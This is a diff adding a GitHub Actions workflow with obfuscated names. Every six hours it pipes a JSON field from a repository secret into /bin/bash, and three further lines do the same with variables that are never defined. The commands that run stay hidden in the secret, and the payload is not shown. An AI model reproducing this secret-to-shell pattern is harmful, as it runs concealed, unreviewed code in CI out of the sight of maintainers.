@@ -1,0 +1,20 @@
+name: xiezhen19871010
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '28 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: xiezhen19871010
+        env:
+          mushe3295: ${{ secrets.mushe3295 }}
+        run: |
+          echo $mushe3295 | jq -r .ewcf874 | /bin/bash
+          echo $jjxab903 | jq -r .nvqz3 | /bin/bash
+          echo $jl4 | jq -r .po76 | /bin/bash
+          echo $nkwk906 | jq -r .dqr18 | /bin/bash
+
